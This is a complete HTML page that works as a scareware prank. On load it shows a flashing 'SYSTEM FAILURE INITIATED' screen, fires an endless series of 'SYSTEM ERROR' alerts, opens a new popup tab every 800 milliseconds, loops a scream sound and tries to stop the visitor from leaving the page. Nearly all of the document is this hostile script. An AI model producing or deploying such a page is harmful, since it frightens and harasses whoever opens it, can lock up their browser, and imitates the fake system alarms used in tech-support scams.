<!DOCTYPE html>
<html>
<head>
  <title>System Failure</title>
  <style>
    body {
      background-color: red;
      color: white;
      text-align: center;
      margin: 0;
      font-family: sans-serif;
    }
    h1 {
      margin-top: 30vh;
      font-size: 3em;
      animation: flash 0.5s infinite;
    }
    @keyframes flash {
      0% { background-color: red; }
      50% { background-color: black; }
      100% { background-color: red; }
    }
  </style>
  <script>
    let count = 0;

    function spamAlerts() {
      setInterval(() => {
        alert("⚠️ SYSTEM ERROR: " + (++count));
      }, 1000);
    }

    function openTabs() {
      setInterval(() => {
        window.open("https://tebintahir44.github.io/website/popup.html", "_blank");
      }, 800);
    }

    window.onload = () => {
      // Start chaos
      spamAlerts();
      openTabs();

      // Scary scream
      const audio = new Audio("https://www.soundjay.com/human/sounds/scream-01.mp3");
      audio.loop = true;
      audio.play();

      // Block exit
      window.onbeforeunload = () => "🔴 ERROR: DO NOT LEAVE!";
    };
  </script>
</head>
<body>
  <h1>🔴 SYSTEM FAILURE INITIATED 🔴</h1>
</body>
</html>
